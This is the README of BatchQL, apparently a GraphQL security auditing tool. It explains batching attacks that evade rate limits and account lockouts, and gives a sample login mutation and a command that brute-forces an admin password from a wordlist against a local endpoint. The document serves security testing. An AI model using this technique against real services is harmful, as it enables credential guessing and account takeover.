# BatchQL

BatchQL is a GraphQL security auditing tool with a focus on performing batch GraphQL queries and mutations.

When exploring the problem space of GraphQL batching attacks, we found that there were a few blog posts on the internet, however no tool to perform GraphQL batching attacks.

GraphQL batching attacks can be quite serious depending on the functionalities implemented. For example, imagine a password reset functionality which expects a 4 digit pin that was sent to your email. With this tool, you could attempt all 10k pin attempts in a single GraphQL query. This may bypass any rate limiting or account lockouts depending on the implementation details of the password reset flow.

# Detections

This tool is capable of detecting the following:

- Introspection query support
- Schema suggestions
- Query name based batching
- Query JSON list based batching

# Attacks

Currently, this tool only supports sending JSON list based queries for batching attacks. It supports scenarios where the variables are embedded in the query, or where they are provided in the JSON input.

# Usage

1. Save a file that contains your GraphQL query i.e. `acc-login.txt`:

```
mutation emailLoginRemembered($loginInput: InputRememberedEmailLogin!) {
  emailLoginRemembered(loginInput: $loginInput) {
    authToken {
      accessToken
      __typename
    }
    userSessionResponse {
      userToken
      userIdentity {
        userId
        identityType
        verified
        onboardingStatus
        registrationReferralCode
        userReferralInfo {
          referralCode {
            code
            valid
            __typename
          }
          __typename
        }
        __typename
      }
      __typename
    }
    __typename
  }
  }
```

2. Run the following command to run a GraphQL batching attack:

```
❯ python batch.py --query acc-login.txt --wordlist passwords.txt -v '{"loginInput":{"email":"admin@shubs.io","password":"#VARIABLE#","rememberMe":false}}' --size 100 -e http://re.local:5000/graphiql -p localhost:8080
```

The above command does the following:

- Specifies a query from a local file `--query acc-login.txt`.
- Specifies a wordlist `--wordlist passwords.txt`
- Specifies the variable input with the replacement identifier `-v {"loginInput":{"email":"admin@shubs.io","password":"#VARIABLE#","rememberMe":false}}`
- Specifies the batch size `--size 100`
- Specifies the endpoint `-e http://re.local:5000/graphiql`
- Specifies a proxy `-p localhost:8080`